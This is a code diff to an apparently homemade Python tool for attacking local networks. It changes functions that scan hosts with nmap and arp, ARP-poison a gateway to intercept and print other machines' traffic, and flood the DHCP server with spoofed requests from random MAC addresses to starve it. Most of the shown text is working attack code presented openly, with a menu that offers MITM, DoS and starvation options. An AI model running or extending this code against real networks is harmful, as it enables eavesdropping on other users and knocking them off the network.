@@ -15,9 +15,10 @@ gateway_ip = ""
 gateway_mac = ""
 packet_count = 1000
 hosts = dict()
+online_hosts = dict()
 
-def get_hosts():
-	print("finding all the hosts in the lan")
+def get_online_hosts_with_mac():
+	print("finding all the hosts with mac addresses in the lan")
 	global nmap_broadcast
 	subprocess.check_output("nmap -sP " + nmap_broadcast, shell=True)
 	arp_result = subprocess.check_output("arp -a", shell=True)
@@ -37,10 +38,26 @@ def get_hosts():
 	global gateway_mac
 	gateway_mac = list(hosts.values())[0]
 
+def get_online_hosts():
+	print("finding all the hosts with mac addresses in the lan")
+	global nmap_broadcast
+	subprocess.check_output("nmap -sP " + nmap_broadcast, shell=True)
+	arp_result = subprocess.check_output("arp -a", shell=True)
+	if arp_result == "":
+		print("no online hosts were find or internet connection is lost")
+		return
+	arp_result = arp_result.decode().split('\n')
+	del arp_result[-1]
+	global online_hosts
+	for host in arp_result:
+		host = host.split(" ")
+		online_hosts[host[1][1:-1]] = host[3]
+	
+
 def arp_poison(target_ip):
 	global gateway_mac, gateway_ip
 	if gateway_ip == "" or gateway_mac == "":
-		get_hosts()
+		get_online_hosts_with_mac()
 	print("starting the mitm attack")
 	try:
 		while True:
@@ -57,7 +74,6 @@ def mitm_callback(pkt):
 		if not pkt[0][1].dst == self_ip and not pkt[0][1].dst == self_ip:
 			pkt.show()
 			print(socket.gethostbyaddr(pkt[0][1].dst))
-			print("******")
 	except Exception as e:
 		pass
 
@@ -75,20 +91,27 @@ def mitm_callback(pkt):
 def starvation_attack():
 	conf.checkIPaddr = False
 	dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
-	sendp(dhcp_discover,loop=1)
+	#sendp(dhcp_discover,loop=1)
+	#print(dhcp_discover)
+	while True:
+		dhcp_request =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","request"),"end"])
+		#print(dhcp_request)
+		sendp(dhcp_request)
+		time.sleep(2)
 
 def starvation_callback(pkt):
 	pkt.show()
 
 while 1:
 	print("select from below options")
-	print("1 get online hosts")
+	print("1 get online hosts with mac addresses")
 	print("2 mitm")
 	print("3 dos")
 	print("4 starvation attack")
+	print("5 get all the hosts")
 	option = input()
 	if option == "1":
-		get_hosts()
+		get_online_hosts_with_mac()
 		for key, value in hosts.items():
 			if key == gateway_ip and value == gateway_mac:
 				print(key + " at " + value + " as gateway")
@@ -117,6 +140,12 @@ while 1:
 		starvation_thread = threading.Thread(target=starvation_attack)
 		starvation_thread.start()
 		packets = sniff(iface="en0", prn=starvation_callback, filter="udp", store=0)
+	if option == "5":
+		get_online_hosts()
+		for key, value in online_hosts.items():
+			print(key + " at " + value)
+		print()
+
 
 
 
